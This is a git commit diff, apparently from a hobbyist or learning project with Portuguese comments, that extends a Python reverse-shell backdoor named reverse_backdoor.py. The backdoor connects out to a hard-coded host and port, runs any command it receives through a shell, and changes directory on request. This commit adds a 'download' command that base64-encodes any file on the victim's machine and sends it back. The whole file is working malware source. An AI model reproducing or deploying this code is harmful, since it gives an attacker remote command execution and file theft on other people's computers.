09a433366433a50dbfa158612d0f7c9c0158ea14
tutu <arthurfaria3000@gmail.com>
2024-02-07 20:25:44 -0300

    backdoor added download added

--- backdoor/reverse_backdoor.py
+++ backdoor/reverse_backdoor.py
@@ -1,4 +1,8 @@
-import socket, subprocess, json,os
+import socket
+import subprocess
+import json
+import os
+import base64
 
 class Backdoor:
     def __init__(self, ip, port):
@@ -15,24 +19,33 @@ class Backdoor:
             try:
                 json_data += self.s.recv(1024)
                 return json.loads(json_data)
-            except ValueError: # Se o json não estiver completo
+            except ValueError:  # Se o json não estiver completo
                 continue
 
     def change_directory(self, path):
         os.chdir(path)
         new_directory = os.getcwd()
         return f"[+] Mudança para {new_directory}"
+
     def execute_command(self, command):
-        return (subprocess.check_output(command, shell=True)).decode('utf-8', errors = "ignore") # O comando retorna um tipo byte, por isso é necessário decodificar para string
+        return (subprocess.check_output(command, shell=True)).decode('utf-8',
+                                                                     errors="ignore")  # O comando retorna um tipo byte, por isso é necessário decodificar para string
+
+    def read_file(self,path):
+        with open(path, "rb") as file:
+            return base64.b64encode(file.read())
 
     def start(self):
         while (1):
             comando = self.serial_receive()
-            if comando[0] == ":q": #comando pode ser tratado como lista por vir de um json
+            if comando[0] == ":q":  # comando pode ser tratado como lista por vir de um json
                 self.stop()
                 break
-            elif comando[0] =="cd" and len(comando) > 1:
-                exec_result =  self.change_directory(comando[1])
+            elif comando[0] == "cd" and len(comando) > 1:
+                exec_result = self.change_directory(comando[1])
+            elif comando[0] == "download" and len(comando) > 1:
+                exec_result = self.read_file(comando[1])
+                exec_result = exec_result.decode('utf-8', errors="ignore")
             else:
                 exec_result = self.execute_command(comando)
             self.serial_send(exec_result)
@@ -41,5 +54,5 @@ class Backdoor:
         self.s.close()
 
 
-bckdr = Backdoor("192.168.0.102",4444)
+bckdr = Backdoor("192.168.0.102", 4444)
 bckdr.start()
